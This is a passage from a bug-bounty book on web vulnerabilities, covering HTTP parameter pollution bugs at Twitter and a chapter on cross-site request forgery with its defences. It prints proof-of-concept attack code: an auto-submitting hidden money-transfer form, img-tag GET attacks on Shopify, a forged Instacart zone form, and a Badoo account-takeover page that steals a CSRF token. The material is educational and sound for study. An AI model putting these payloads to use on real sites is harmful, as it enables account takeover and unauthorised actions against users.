takes\npersistence. In August 2015, hacker Mert Tasci noticed an interesting\nURL (which I’ve shortened here) when unsubscribing from receiving\nTwitter notifications:\nhttps://twitter.com/i/u?iid=F6542&uid=1134885524&nid=22+26&sig=647192e86e28fb6\n691db2502c5ef6cf3xxx\nNotice the parameter UID. This UID happens to be the user ID of\nthe currently signed-in Twitter account. After noticing the UID, Tasci\ndid what most hackers would do—he tried changing the UID to that of\nanother user, but nothing happened. Twitter just returned an error.\nDetermined to continue when others might have given up, Tasci\ntried adding a second UID parameter so the URL looked like this\n(again, a shortened version):\nhttps://twitter.com/i/u?iid=F6542&uid=2321301342&uid=1134885524&nid=22+26&sig=\n647192e86e28fb6691db2502c5ef6cf3xxx\nSuccess! He managed to unsubscribe another user from their email\n72\nDownload from www.finelybook.com 7450911@qq.com\nnotifications. Twitter was vulnerable to HPP unsubscribing of users.\nThe reason this vulnerability is noteworthy, as explained to me by\nFileDescriptor, relates to the SIG parameter. As it turns out, Twitter\ngenerates the SIG value using the UID value. When a user clicks the\nunsubscribe URL, Twitter validates that the URL has not been\ntampered with by checking the SIG and UID values. So, in Tasci’s\ninitial test, changing the UID to unsubscribe another user failed\nbecause the signature no longer matched what Twitter was expecting.\nHowever, by adding a second UID, Tasci succeeded in making Twitter\nvalidate the signature with the first UID parameter but perform the\nunsubscribe action using the second UID parameter.\nTakeaways\nTasci’s efforts demonstrate the importance of persistence and\nknowledge. If he had walked away from the vulnerability after\nchanging the UID to another user’s and failing or had he not known\nabout HPP-type vulnerabilities, he wouldn’t have received his $700\nbounty.\nAlso, keep an eye out for parameters with auto-incremented\nintegers, like UID, that are included in HTTP requests: many\nvulnerabilities involve manipulating parameter values like these to\nmake web applications behave in unexpected ways. I’ll discuss this in\nmore detail in Chapter 16.\nTWITTER WEB INTENTS\nDifficulty: Low\nURL: https://twitter.com/\n73\nDownload from www.finelybook.com 7450911@qq.com\nSource: https://ericrafaloff.com/parameter-tampering-attack-on-\ntwitter-web-intents/\nDate reported: November 2015\nBounty paid: Undisclosed\nIn some cases, an HPP vulnerability can be indicative of other issues\nand can lead to finding additional bugs. This is what happened in the\nTwitter Web Intents feature. The feature provides pop-up flows for\nworking with Twitter users’ tweets, replies, retweets, likes, and\nfollows in the context of non-Twitter sites. Twitter Web Intents make\nit possible for users to interact with Twitter content without leaving\nthe page or having to authorize a new app just for the interaction.\nFigure 3-1 shows an example of what one of these pop-ups looks like.\nFigure 3-1: An early version of the Twitter Web Intents feature, which allows users\nto interact with Twitter content without leaving the page. In this example, users\ncan like Jack’s tweet.\n74\nDownload from www.finelybook.com 7450911@qq.com\nTesting this feature, hacker Eric Rafaloff found that all four intent\ntypes—following a user, liking a tweet, retweeting, and tweeting—\nwere vulnerable to HPP. Twitter would create each intent via a GET\nrequest with URL parameters like the following:\nhttps://twitter.com/intent/intentType?parameter_name=parameterValue\nThis URL would include intentType and one or more parameter\nname/value pairs—for example, a Twitter username and Tweet ID.\nTwitter would use these parameters to create the pop-up intent to\ndisplay the user to follow or tweet to like. Rafaloff discovered a\nproblem when he created a URL with two screen_name parameters\ninstead of the expected singular screen_name for a follow intent:\nhttps://twitter.com/intent/follow?screen_name=twitter&screen_name=ericrtest3\nTwitter would handle the request by giving precedence to the\nsecond screen_name value, ericrtest3, instead of the first twitter value\nwhen generating a Follow button. Consequently, a user attempting to\nfollow Twitter’s official account could be tricked into following\nRafaloff’s test account. Visiting the URL Rafaloff created would\ncause Twitter’s backend code to generate the following HTML form\nusing the two screen_name parameters:\n➊ <form class=\"follow\" id=\"follow_btn_form\" action=\"/intent/follow?screen\n_name=ericrtest3\" method=\"post\">\n<input type=\"hidden\" name=\"authenticity_token\" value=\"...\">\n➋ <input type=\"hidden\" name=\"screen_name\" value=\"twitter\">\n➌ <input type=\"hidden\" name=\"profile_id\" value=\"783214\">\n<button class=\"button\" type=\"submit\">\n<b></b><strong>Follow</strong>\n</button>\n</form>\n75\nDownload from www.finelybook.com 7450911@qq.com\nTwitter would use the information from the first screen_name\nparameter, which is associated with the official Twitter account. As a\nresult, a target would see the correct profile of the user they intended\nto follow because the URL’s first screen_name parameter is used to\npopulate the code at ➋ and ➌. But, after clicking the button, the\ntarget would follow ericrtest3, because the action in the form tag would\ninstead use the second screen_name parameter’s value ➊ passed to the\noriginal URL.\nSimilarly, when presenting intents for liking, Rafaloff found he\ncould include a screen_name parameter despite its having no relevance\nto liking the tweet. For example, he could create this URL:\nhttps://twitter.com/intent/like?tweet_i.d=6616252302978211845&screen\n_name=ericrtest3\nA normal like intent would only need the tweet_id parameter;\nhowever, Rafaloff injected the screen_name parameter to the end of the\nURL. Liking this tweet would result in a target’s being presented with\nthe correct owner profile to like the tweet. But the Follow button next\nto the correct tweet and the correct profile of the tweeter would be for\nthe unrelated user ericrtest3.\nTakeaways\nThe Twitter Web Intents vulnerability is similar to the previous UID\nTwitter vulnerability. Unsurprisingly, when a site is vulnerable to a\nflaw like HPP, it might be indicative of a broader systemic issue.\nSometimes, when you find such a vulnerability, it’s worth taking the\ntime to explore the platform in its entirety to see if there are other\nareas where you might be able to exploit similar behavior.\n76\nDownload from www.finelybook.com 7450911@qq.com\nSUMMARY\nThe risk posed by HPP is contingent on the actions a site’s backend\nperforms and where the polluted parameters are being used.\nDiscovering HPP vulnerabilities requires thorough testing, more so\nthan for some other vulnerabilities, because we usually can’t access\nthe code servers run after receiving our HTTP request. This means we\ncan only infer how sites handle the parameters we pass to them.\nThrough trial and error, you might discover situations in which\nHPP vulnerabilities occur. Usually, social media links are a good first\nplace to test for this vulnerability type, but remember to keep digging\nand think of HPP when you’re testing for parameter substitutions,\nsuch as ID-like values.\n77"
  },
  {
    "input": "",
    "summary": "",
    "output": "Download from www.finelybook.com 7450911@qq.com\n4\nCROSS-SITE REQUEST FORGERY\nA cross-site request forgery (CSRF) attack occurs when an attacker\ncan make a target’s browser send an HTTP request to another website.\nThat website then performs an action as though the request were valid\nand sent by the target. Such an attack typically relies on the target\nbeing previously authenticated on the vulnerable website where the\naction is submitted and occurs without the target’s knowledge. When\na CSRF attack is successful, the attacker is able to modify server-side\ninformation and might even take over a user’s account. Here is a basic\nexample, which we’ll walk through shortly:\n1. Bob logs into his banking website to check his balance.\n2. When he’s finished, Bob checks his email account on a different domain.\n3. Bob has an email with a link to an unfamiliar website and clicks the link\nto see where it leads.\n4. When loaded, the unfamiliar site instructs Bob’s browser to make an\nHTTP request to Bob’s banking website, requesting a money transfer from\nhis account to the attacker’s.\n5. Bob’s banking website receives the HTTP request initiated from the\nunfamiliar (and malicious) website. But because the banking website\n78\nDownload from www.finelybook.com 7450911@qq.com\ndoesn’t have any CSRF protections, it processes the transfer.\nAUTHENTICATION\nCRSF attacks, like the one I just described, take advantage of\nweaknesses in the process websites use to authenticate requests. When\nyou visit a website that requires you to log in, usually with a username\nand password, that site will typically authenticate you. The site will\nthen store that authentication in your browser so you don’t have to log\nin every time you visit a new page on that site. It can store the\nauthentication in two ways: using the basic authentication protocol or\na cookie.\nYou can identify a site that uses basic authorization when HTTP\nrequests include a header that looks like this: Authorization: Basic\nQWxhZGRpbjpPcGVuU2VzYW1l. The random-looking string is a base64-\nencoded username and password separated by a colon. In this case,\nQWxhZGRpbjpPcGVuU2VzYW1l decodes to Aladdin:OpenSesame. We\nwon’t focus on basic authentication in this chapter, but you can use\nmany of the techniques covered here to exploit CSRF vulnerabilities\nthat use basic authentication.\nCookies are small files that websites create and store in the user’s\nbrowser. Websites use cookies for various purposes, such as for\nstoring information like user preferences or the user’s history of\nvisiting a website. Cookies have certain attributes, which are\nstandardized pieces of information. Those details tell browsers about\nthe cookies and how to treat them. Some cookie attributes can include\ndomain, expires, max-age, secure, and httponly, which you’ll learn about\nlater in this chapter. In addition to attributes, cookies can contain a\nname/value pair, which consists of an identifier and an associated\n79\nDownload from www.finelybook.com 7450911@qq.com\nvalue that is passed to a website (the cookie’s domain attribute defines\nthe site to pass this information to).\nBrowsers define the number of cookies that a site can set. But\ntypically, single sites can set anywhere from 50 to 150 cookies in\ncommon browsers, and some reportedly support upward of 600.\nBrowsers generally allow sites to use a maximum of 4KB per cookie.\nThere is no standard for cookie names or values: sites are free to\nchoose their own name/value pairs and purposes. For example, a site\ncould use a cookie named sessionId to remember who a user is rather\nthan having them enter their username and password for every page\nthey visit or action they perform. (Recall that HTTP requests are\nstateless, as described in Chapter 1. Stateless means that with every\nHTTP request, a website doesn’t know who a user is, so it must\nreauthenticate that user for every request.)\nAs an example, a name/value pair in a cookie could be\nsessionId=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f0\n0a08 and the cookie could have a domain of .site.com. Consequently, the\nsessionId cookie will be sent to every .<site>.com site a user visits,\nsuch as foo.<site>.com, bar.<site>.com, www.<site>.com, and so on.\nThe secure and httponly attributes tell browsers when and how to\nsend and read cookies. These attributes don’t contain values; instead,\nthey act as flags that are either present in the cookie or are not. When\na cookie contains the secure attribute, browsers will only send that\ncookie when visiting HTTPS sites. For example, if you visited\nhttp://www.<site>.com/ (an HTTP site) with a secure cookie, your\nbrowser wouldn’t send the cookie to that site. The reason is to protect\nyour privacy, because HTTPS connections are encrypted and HTTP\nconnections are not. The httponly attribute, which will become\nimportant when you learn about cross-site scripting in Chapter 7, tells\n80\nDownload from www.finelybook.com 7450911@qq.com\nthe browser to read a cookie only through HTTP and HTTPS requests.\nTherefore, browsers won’t allow any scripting languages, such as\nJavaScript, to read that cookie’s value. When the secure and httponly\nattributes are not set in cookies, those cookies could be sent\nlegitimately but read maliciously. A cookie without the secure attribute\ncan be sent to a non-HTTPS site; likewise, a cookie without httponly\nset can be read by JavaScript.\nThe expires and max-age attributes indicate when a cookie should\nexpire and the browser should destroy it. The expires attribute simply\ntells the browser to destroy a cookie on a specific date. For example, a\ncookie could set the attribute to expires=Wed, 18 Dec 2019 12:00:00 UTC.\nIn contrast, the max-age is the number of seconds until the cookie\nexpires and is formatted as an integer (max-age=300).\nTo summarize, if the banking site Bob visits uses cookies, the site\nwill store his authentication with the following process. Once Bob\nvisits the site and logs in, the bank will respond to his HTTP request\nwith an HTTP response, which includes a cookie that identifies Bob.\nIn turn, Bob’s browser will automatically send that cookie with all\nother HTTP requests to the banking website.\nAfter finishing his banking, Bob doesn’t log out when he leaves\nthe banking website. Note this important detail, because when you log\nout of a site, that site will typically respond with an HTTP response\nthat expires your cookie. As a result, when you revisit the site, you’ll\nhave to log in again.\nWhen Bob checks his email and clicks the link to visit the\nunknown site, he is inadvertently visiting a malicious website. That\nwebsite is designed to perform a CSRF attack by instructing Bob’s\nbrowser to make a request to his banking website. This request will\n81\nDownload from www.finelybook.com 7450911@qq.com\nalso send cookies from his browser.\nCSRF WITH GET REQUESTS\nThe way the malicious site exploits Bob’s banking site depends on\nwhether the bank accepts transfers via GET or POST requests. If Bob’s\nbanking site accepts transfers via GET requests, the malicious site will\nsend the HTTP request with either a hidden form or an <img> tag. The\nGET and POST methods both rely on HTML to make browsers send the\nrequired HTTP request, and both methods can use the hidden form\ntechnique, but only the GET method can use the <img> tag technique.\nIn this section, we’ll look at how the attack works with the HTML\n<img> tag technique when using the GET request method, and we’ll\nlook at the hidden form technique in the next section, “CSRF with\nPOST Requests.”\nThe attacker needs to include Bob’s cookies in any transfer HTTP\nrequest to Bob’s banking website. But because the attacker has no way\nof reading Bob’s cookies, the attacker can’t just create an HTTP\nrequest and send it to the banking site. Instead, the attacker can use the\nHTML <img> tag to create a GET request that also includes Bob’s\ncookies. An <img> tag renders images on a web page and includes an\nsrc attribute, which tells browsers where to locate image files. When a\nbrowser renders an <img> tag, it will make an HTTP GET request to\nthe src attribute in the tag and include any existing cookies in that\nrequest. So, let’s say that the malicious site uses a URL like the\nfollowing that transfers $500 from Bob to Joe:\nhttps://www.bank.com/transfer?from=bob&to=joe&amount=500\nThen the malicious <img> tag would use this URL as its source\n82\nDownload from www.finelybook.com 7450911@qq.com\nvalue, as in the following tag:\n<img src=\"https://www.bank.com/transfer?from=bob&to=joe&amount=500\">\nAs a result, when Bob visits the attacker-owned site, it includes the\n<img> tag in its HTTP response, and the browser then makes the\nHTTP GET request to the bank. The browser sends Bob’s\nauthentication cookies to get what it thinks should be an image. But in\nfact, the bank receives the request, processes the URL in the tag’s src\nattribute, and creates the transfer request.\nTo avoid this vulnerability, developers should never use HTTP\nGET requests to perform any backend data-modifying requests, such as\ntransferring money. But any request that is read-only should be safe.\nMany common web frameworks used to build websites, such as Ruby\non Rails, Django, and so on, will expect developers to follow this\nprinciple, and so they’ll automatically add CSRF protections to POST\nrequests but not GET requests.\nCSRF WITH POST REQUESTS\nIf the bank performs transfers with POST requests, you’ll need to use a\ndifferent approach to create a CSRF attack. An attacker couldn’t use\nan <img> tag, because an <img> tag can’t invoke a POST request.\nInstead, the attacker’s strategy will depend on the contents of the POST\nrequest.\nThe simplest situation involves a POST request with the content-\ntype application/x-www-form-urlencoded or text/plain. The content-type is a\nheader that browsers might include when sending HTTP requests. The\nheader tells the recipient how the body of the HTTP request is\nencoded. Here is an example of a text/plain content-type request:\n83\nDownload from www.finelybook.com 7450911@qq.com\nPOST / HTTP/1.1\nHost: www.google.ca\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Length: 5\n➊ Content-Type: text/plain;charset=UTF-8\nDNT: 1\nConnection: close\nhello\nThe content-type ➊ is labeled, and its type is listed along with the\ncharacter encoding of the request. The content-type is important\nbecause browsers treat types differently (which I’ll get to in a second).\nIn this situation, it’s possible for a malicious site to create a hidden\nHTML form and submit it silently to the vulnerable site without the\ntarget’s knowledge. The form can submit a POST or GET request to a\nURL and can even submit parameter values. Here is an example of\nsome harmful code in the website that the malicious link would direct\nBob to:\n➊ <iframe style=\"display:none\" name=\"csrf-frame\"></iframe>\n➋ <form method='POST' action='http://bank.com/transfer' target=\"csrf-frame\"\nid=\"csrf-form\">\n➌ <input type='hidden' name='from' value='Bob'>\n<input type='hidden' name='to' value='Joe'>\n<input type='hidden' name='amount' value='500'>\n<input type='submit' value='submit'>\n</form>\n➍ <script>document.getElementById(\"csrf-form\").submit()</script>\nHere, we’re making an HTTP POST request ➋ to Bob’s bank with\na form (which is denoted by the action attribute in the <form> tag).\nBecause the attacker doesn’t want Bob to see the form, each of the\n<input> elements ➌ are given the type 'hidden', which makes them\n84\nDownload from www.finelybook.com 7450911@qq.com\ninvisible on the web page Bob sees. As the final step, the attacker\nincludes some JavaScript inside a <script> tag to automatically submit\nthe form when the page is loaded ➍. The JavaScript does this by\ncalling the getElementByID() method on the HTML document with the\nID of the form (\"csrf-form\") that we set in the second line ➋ as an\nargument. As with a GET request, once the form is submitted, the\nbrowser makes the HTTP POST request to send Bob’s cookies to the\nbank site, which invokes a transfer. Because POST requests send an\nHTTP response back to the browser, the attacker hides the response in\nan iFrame using the display:none attribute ➊. As a result, Bob doesn’t\nsee it and doesn’t realize what has happened.\nIn other scenarios, a site might expect the POST request to be\nsubmitted with the content-type application/json instead. In some cases,\na request that is an application/json type will have a CSRF token. This\ntoken is a value that is submitted with the HTTP request so the\nlegitimate site can validate that the request originated from itself, not\nfrom another, malicious site. Sometimes the HTTP body of the POST\nrequest includes the token, but at other times the POST request has a\ncustom header with a name like X-CSRF-TOKEN. When a browser\nsends an application/json POST request to a site, it will send an OPTIONS\nHTTP request before the POST request. The site then returns a\nresponse to the OPTIONS call indicating which types of HTTP requests\nit accepts and from what trusted origins. This is referred to as a\npreflight OPTIONS call. The browser reads this response and then\nmakes the appropriate HTTP request, which in our bank example\nwould be a POST request for the transfer.\nIf implemented correctly, the preflight OPTIONS call protects\nagainst some CSRF vulnerabilities: the malicious sites won’t be listed\n85\nDownload from www.finelybook.com 7450911@qq.com\nas trusted sites by the server, and browsers will only allow specific\nwebsites (known as white-listed websites) to read the HTTP OPTIONS\nresponse. As a result, because the malicious site can’t read the\nOPTIONS response, browsers won’t send the malicious POST request.\nThe set of rules defining when and how websites can read\nresponses from each other is called cross-origin resource sharing\n(CORS). CORS restricts resource access, including JSON response\naccess, from a domain outside that which served the file or is allowed\nby the site being tested. In other words, when developers use CORS to\nprotect a site, you can’t submit an application/json request to call the\napplication being tested, read the response, and make another call\nunless the site being tested allows it. In some situations, you can\nbypass these protections by changing the content-type header to\napplication/x-www-form-urlencoded, multipart/form-data, or text/plain.\nBrowsers don’t send preflight OPTIONS calls for any of these three\ncontent-types when making a POST request, so a CSRF request might\nwork. If it doesn’t, look at the Access-Control-Allow-Origin header in the\nserver’s HTTP responses to double-check that the server is not\ntrusting arbitrary origins. If that response header changes when\nrequests are sent from arbitrary origins, the site might have bigger\nproblems because it allows any origin to read responses from its\nserver. This allows for CSRF vulnerabilities but might also allow\nmalicious attackers to read any sensitive data returned in the server’s\nHTTP responses.\nDEFENSES AGAINST CSRF ATTACKS\nYou can mitigate CSRF vulnerabilities in a number of ways. One of\nthe most popular forms of protection against CSRF attacks is the\n86\nDownload from www.finelybook.com 7450911@qq.com\nCSRF token. Protected sites require the CSRF token when requests\nare submitted that could potentially alter data (that is, POST requests).\nIn such a situation, a web application (like Bob’s bank) would\ngenerate a token with two parts: one that Bob would receive and one\nthat the application would retain. When Bob attempts to make transfer\nrequests, he would have to submit his token, which the bank would\nthen validate with its side of the token. The design of these tokens\nmakes them unguessable and only accessible to the specific user\nthey’re assigned to (like Bob). In addition, they aren’t always\nobviously named, but some potential examples of names include X-\nCSRF-TOKEN, lia-token, rt, or form-id. Tokens can be included in HTTP\nrequest headers, in an HTTP POST body, or as a hidden field, as in the\nfollowing example:\n<form method='POST' action='http://bank.com/transfer'>\n<input type='text' name='from' value='Bob'>\n<input type='text' name='to' value='Joe'>\n<input type='text' name='amount' value='500'>\n<input type='hidden' name='csrf'\nvalue='lHt7DDDyUNKoHCC66BsPB8aN4p24hxNu6ZuJA+8l+YA='>\n<input type='submit' value='submit'>\n</form>\nIn this example, the site could get the CSRF token from a cookie,\nan embedded script on the website, or as part of the content delivered\nfrom the site. Regardless of the method, only the target’s web browser\nwould know and be able to read the value. Because the attacker\ncouldn’t submit the token, they wouldn’t be able to successfully\nsubmit a POST request and wouldn’t be able to carry out a CSRF\nattack. However, just because a site uses CSRF tokens doesn’t mean\nit’s a dead end when you’re searching for vulnerabilities to exploit.\nTry removing the token, changing its value, and so on to confirm the\n87\nDownload from www.finelybook.com 7450911@qq.com\ntoken has been properly implemented.\nThe other way sites protect themselves is by using CORS;\nhowever, this isn’t foolproof because it relies on browser security and\nensuring proper CORS configurations to determine when third-party\nsites can access responses. Attackers can sometimes bypass CORS by\nchanging the content-type from application/json to application/x-www-form-\nurlencoded or by using a GET request instead of a POST request because\nof misconfigurations on the server side. The reason the bypass works\nis that browsers will automatically send an OPTIONS HTTP request\nwhen the content type is application/json but won’t automatically send\nan OPTIONS HTTP request if it’s a GET request or the content type is\napplication/x-www-form-urlencoded.\nLastly, there are two additional and less common CSRF mitigation\nstrategies. First, the site could check the value of the Origin or Referer\nheader submitted with an HTTP request and ensure it contains the\nexpected value. For example, in some cases, Twitter will check the\nOrigin header and, if it’s not included, check the Referer header. This\nworks because browsers control these headers and attackers can’t set\nor change them remotely (obviously, this excludes exploiting a\nvulnerability in browsers or browser plug-ins that might allow an\nattacker to control either header). Second, browsers are now beginning\nto implement support for a new cookie attribute called samesite. This\nattribute can be set as strict or lax. When set as strict, the browser will\nnot send the cookie with any HTTP request that doesn’t originate from\nthe site. This includes even simple HTTP GET requests. For example,\nif you were logged into Amazon and it used strict samesite cookies, the\nbrowser would not submit your cookies if you were following a link\nfrom another site. Also, Amazon would not recognize you as logged\nin until you visited another Amazon web page and the cookies were\n88\nDownload from www.finelybook.com 7450911@qq.com\nthen submitted. In contrast, setting the samesite attribute as lax instructs\nbrowsers to send cookies with initial GET requests. This supports the\ndesign principle that GET requests should never alter data on the server\nside. In this case, if you were logged into Amazon and it used lax\nsamesite cookies, the browser would submit your cookies and Amazon\nwould recognize you as logged in if you had been redirected there\nfrom another site.\nSHOPIFY TWITTER DISCONNECT\nDifficulty: Low\nURL: https://twitter-\ncommerce.shopifyapps.com/auth/twitter/disconnect/\nSource: https://www.hackerone.com/reports/111216/\nDate reported: January 17, 2016\nBounty paid: $500\nWhen you’re looking for potential CSRF vulnerabilities, be on the\nlookout for GET requests that modify server-side data. For example, a\nhacker discovered a vulnerability in a Shopify feature that integrated\nTwitter into the site to let shop owners tweet about their products. The\nfeature also allowed users to disconnect a Twitter account from a\nconnected shop. The URL to disconnect a Twitter account was the\nfollowing:\nhttps://twitter-commerce.shopifyapps.com/auth/twitter/disconnect/\nAs it turns out, visiting this URL would send a GET request to\ndisconnect the account, as follows:\n89\nDownload from www.finelybook.com 7450911@qq.com\nGET /auth/twitter/disconnect HTTP/1.1\nHost: twitter-commerce.shopifyapps.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101\nFirefox/43.0\nAccept: text/html, application/xhtml+xml, application/xml\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://twitter-commerce.shopifyapps.com/account\nCookie: _twitter-commerce_session=REDACTED\nConnection: keep-alive\nIn addition, when the link was originally implemented, Shopify\nwasn’t validating the legitimacy of the GET requests sent to it, making\nthe URL vulnerable to CSRF.\nThe hacker WeSecureApp, who filed the report, provided the\nfollowing proof-of-concept HTML document:\n<html>\n<body>\n➊ <img src=\"https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect\">\n</body>\n</html>\nWhen opened, this HTML document would cause the browser to\nsend an HTTP GET request to https://twitter-\ncommerce.shopifyapps.com through the <img> tag’s src attribute ➊. If\nsomeone with a Twitter account connected to Shopify visited a web\npage with this <img> tag, their Twitter account would be disconnected\nfrom Shopify.\nTakeaways\nKeep an eye out for HTTP requests that perform some action on the\nserver, such as disconnecting a Twitter account, via a GET request. As\n90\nDownload from www.finelybook.com 7450911@qq.com\nmentioned earlier, GET requests should never modify any data on the\nserver. In this situation, you could have found the vulnerability by\nusing a proxy server, such as Burp or OWASP’s ZAP, to monitor the\nHTTP requests being sent to Shopify.\nCHANGE USERS INSTACART ZONES\nDifficulty: Low\nURL: https://admin.instacart.com/api/v2/zones/\nSource: https://hackerone.com/reports/157993/\nDate reported: August 9, 2015\nBounty paid: $100\nWhen you’re looking at the attack surface, remember to consider a\nwebsite’s API endpoints as well as its web pages. Instacart is a\ngrocery delivery app that allows its deliverers to define the zones they\nwork in. The site updated these zones with a POST request to the\nInstacart admin subdomain. A hacker discovered that the zone’s\nendpoint on this subdomain was vulnerable to CSRF. For example,\nyou could modify a target’s zone with the following code:\n<html>\n<body>\n➊ <form action=\"https://admin.instacart.com/api/v2/zones\" method=\"POST\">\n➋ <input type=\"hidden\" name=\"zip\" value=\"10001\" />\n➌ <input type=\"hidden\" name=\"override\" value=\"true\" />\n➍ <input type=\"submit\" value=\"Submit request\" />\n</form>\n</body>\n</html>\nIn this example, the hacker created an HTML form to send an\n91\nDownload from www.finelybook.com 7450911@qq.com\nHTTP POST request to the /api/v2/zones endpoint ➊. The hacker\nincluded two hidden inputs: one to set the user’s new zone to the ZIP\ncode 10001 ➋ and one to set the API’s override parameter to true ➌ so\nthe user’s current zip value was replaced with the hacker’s submitted\nvalue. Additionally, the hacker included a submit button to make the\nPOST request ➍, unlike the Shopify example, which used an auto-\nsubmitting JavaScript function.\nAlthough this example is still successful, the hacker could improve\nthe exploit by using the techniques described earlier, such as using a\nhidden iFrame to auto-submit the request on the target’s behalf. This\nwould demonstrate to the Instacart bug bounty triagers how an\nattacker could use this vulnerability with less target action;\nvulnerabilities that are entirely attacker controlled are more likely to\nbe successfully exploited than those that aren’t.\nTakeaways\nWhen you’re looking for exploits, broaden your attack scope and look\nbeyond just a website’s pages to include its API endpoints, which\noffer great potential for vulnerabilities. Occasionally, developers\nforget that hackers can discover and exploit API endpoints, because\nthey aren’t readily available like web pages. For example, mobile\napplications often make HTTP requests to API endpoints, which you\ncan monitor with Burp or ZAP just as you do websites.\nBADOO FULL ACCOUNT TAKEOVER\nDifficulty: Medium\nURL: https://www.badoo.com/\nSource: https://hackerone.com/reports/127703/\n92\nDownload from www.finelybook.com 7450911@qq.com\nDate reported: April 1, 2016\nBounty paid: $852\nAlthough developers often use CSRF tokens to protect against CSRF\nvulnerabilities, in some cases, attackers can steal the tokens, as you’ll\nsee in this bug. If you explore the social networking website\nhttps://www.badoo.com/, you’ll see that it uses CSRF tokens. More\nspecifically, it uses a URL parameter, rt, which is unique to each user.\nWhen Badoo’s bug bounty program went live on HackerOne, I\ncouldn’t find a way to exploit it. However, the hacker Mahmoud\nJamal did.\nJamal recognized the rt parameter and its significance. He also\nnoticed that the parameter was returned in almost all JSON responses.\nUnfortunately, this wasn’t helpful because CORS protects Badoo from\nattackers reading those responses, since they’re encoded as\napplication/json content types. But Jamal kept digging.\nJamal eventually found the JavaScript file\nhttps://eu1.badoo.com/worker-scope/chrome-service-worker.js, which\ncontained a variable called url_stats and was set to the following value:\nvar url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<➊rt_param_value>';\nThe url_stats variable stored a URL that contained the user’s unique\nrt value as a parameter when the user’s browser accessed the\nJavaScript file ➊. Even better, to obtain the user’s rt value, an attacker\nwould just need the target to visit a malicious web page that would\naccess the JavaScript file. CORS does not block this because browsers\nare allowed to read and embed remote JavaScript files from external\nsources. The attacker could then use the rt value to link any social\nmedia account with the user’s Badoo account. As a result, the attacker\n93\nDownload from www.finelybook.com 7450911@qq.com\ncould invoke HTTP POST requests to modify the target’s account.\nHere’s the HTML page Jamal used to accomplish this exploit:\n<html>\n<head>\n<title>Badoo account take over</title>\n➊ <script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.\njs?ws=1></script>\n</head>\n<body>\n<script>\n➋ function getCSRFcode(str) {\nreturn str.split('=')[2];\n}\n➌ window.onload = function(){\n➍ var csrf_code = getCSRFcode(url_stats);\n➎ csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3y\nfn2SFUBear08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679\n219ce71044666c7be3e037ff54b560..a810&prompt=none&rt='+ csrf_code;\n➏ window.location = csrf_url;\n};\n</script>\n</body>\n</html>\nWhen a target loads this page, the page will load the Badoo\nJavaScript by referencing it as the src attribute in a <script> tag ➊.\nHaving loaded the script, the web page then calls the JavaScript\nfunction window.onload, which defines an anonymous JavaScript\nfunction ➌. Browsers call the onload event handler when a web page\nloads; because the function Jamal defined is in the window.onload\nhandler, his function will always be called when the page is loaded.\nNext, Jamal created a csrf_code variable ➍ and assigned it the\nreturn value of a function he defined at ➋ called getCSRFcode. The\ngetCSRFcode function takes and splits a string into an array of strings at\n94\nDownload from www.finelybook.com 7450911@qq.com\neach '=' character. It then returns the value of the third member of the\narray. When the function parses the variable url_stats from Badoo’s\nvulnerable JavaScript file at ➍, it splits the string into the following\narray value:\nhttps://eu1.badoo.com/chrome-push-stats?ws,1&rt,<rt_param_value>\nThen the function returns the third member of the array, which is\nthe rt value, and assigns that to csrf_code.\nOnce he had the CSRF token, Jamal created the csrf_url variable,\nwhich stores a URL to Badoo’s /google/verify.phtml web page. The\nweb page links his own Google account to the target’s Badoo account\n➎. This page requires some parameters, which are hardcoded into the\nURL string. I won’t cover them in detail here because they’re specific\nto Badoo. However, note the final rt parameter, which doesn’t have a\nhardcoded value. Instead, csrf_code is concatenated to the end of the\nURL string so it’s passed as the rt parameter’s value. Jamal then\nmakes an HTTP request by invoking window.location ➏ and assigns it\nto csrf_url, which redirects the visiting user’s browser to the URL at\n➎. This results in a GET request to Badoo, which validates the rt\nparameter and processes the request to link the target’s Badoo account\nto Jamal’s Google account, thereby completing the account takeover.\nTakeaways\nWhere there’s smoke, there’s fire. Jamal noticed that the rt parameter\nwas being returned in different locations, particularly in JSON\nresponses. For that reason, he rightly guessed that rt might show up\nsomeplace where an attacker could access and exploit it, which in this\ncase was a JavaScript file. If you feel like a site might be vulnerable,\n95\nDownload from www.finelybook.com 7450911@qq.com\nkeep digging. In this case, I thought it was odd that the CSRF token\nwould only be five digits long and included in URLs. Normally,\ntokens are much longer, making them harder to guess, and included in\nHTTP POST request bodies, not URLs. Use a proxy and check all the\nresources that are being called when you visit a site or application.\nBurp allows you to search through all your proxy history to look for\nspecific terms or values, which would have revealed the rt value\nincluded in the JavaScript files here. You might find an information\nleak with sensitive data, such as a CSRF token.\nSUMMARY\nCSRF vulnerabilities represent another attack vector that attackers can\nexecute without the target even knowing or actively performing an\naction. Finding CSRF vulnerabilities can take some ingenuity and a\nwillingness to test all functionality on a site.\nGenerally, application frameworks, such as Ruby on Rails, are\nincreasingly protecting web forms if the site is performing POST\nrequests; however, this isn’t the case for GET requests. Therefore, be\nsure to keep an eye out for any GET HTTP calls that change server-\nside user data (like disconnecting Twitter accounts). Also, although I\ndidn’t include an example of it, if you see that a site is sending a\nCSRF token with a POST request, you can try changing the CSRF\ntoken value or removing it entirely to ensure the server is validating its\nexistence.\n96"
  },
  {
    "input": "",
